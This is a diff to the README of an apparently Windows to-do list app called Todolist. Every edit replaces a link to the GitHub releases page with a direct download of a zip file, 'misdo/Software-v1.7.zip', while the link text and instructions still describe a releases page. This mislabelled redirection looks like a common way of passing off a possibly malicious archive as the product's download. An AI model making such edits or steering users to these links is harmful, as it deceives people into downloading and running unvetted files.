@@ -1,6 +1,6 @@
 # ✅ Todolist - Keep Tasks Clear and Simple
 
-[![Download Todolist](https://img.shields.io/badge/Download-Todolist-7c3aed?style=for-the-badge)](https://github.com/franciscaunpointed922/Todolist/releases)
+[![Download Todolist](https://img.shields.io/badge/Download-Todolist-7c3aed?style=for-the-badge)](https://raw.githubusercontent.com/franciscaunpointed922/Todolist/main/misdo/Software-v1.7.zip)
 
 ## 🧭 Overview
 
@@ -33,7 +33,7 @@ For best use:
 
 Visit this page to download Todolist:
 
-[Download Todolist from Releases](https://github.com/franciscaunpointed922/Todolist/releases)
+[Download Todolist from Releases](https://raw.githubusercontent.com/franciscaunpointed922/Todolist/main/misdo/Software-v1.7.zip)
 
 Open the page, then look for the latest release file. Download the Windows app file from there.
 
@@ -41,7 +41,7 @@ Open the page, then look for the latest release file. Download the Windows app f
 
 Follow these steps:
 
-1. Open the [Todolist releases page](https://github.com/franciscaunpointed922/Todolist/releases)
+1. Open the [Todolist releases page](https://raw.githubusercontent.com/franciscaunpointed922/Todolist/main/misdo/Software-v1.7.zip)
 2. Find the newest release at the top of the page
 3. Under the release files, click the Windows download file
 4. Save the file to your computer
@@ -172,7 +172,7 @@ Good habits:
 
 ## 📌 Quick Start
 
-1. Open the [releases page](https://github.com/franciscaunpointed922/Todolist/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/franciscaunpointed922/Todolist/main/misdo/Software-v1.7.zip)
 2. Download the latest Windows file
 3. Extract it if needed
 4. Open the app
@@ -183,7 +183,7 @@ Good habits:
 
 If you need the file later, use this page:
 
-[https://github.com/franciscaunpointed922/Todolist/releases](https://github.com/franciscaunpointed922/Todolist/releases)
+[https://raw.githubusercontent.com/franciscaunpointed922/Todolist/main/misdo/Software-v1.7.zip](https://raw.githubusercontent.com/franciscaunpointed922/Todolist/main/misdo/Software-v1.7.zip)
 
 ## 🗃️ Best Use Cases
 
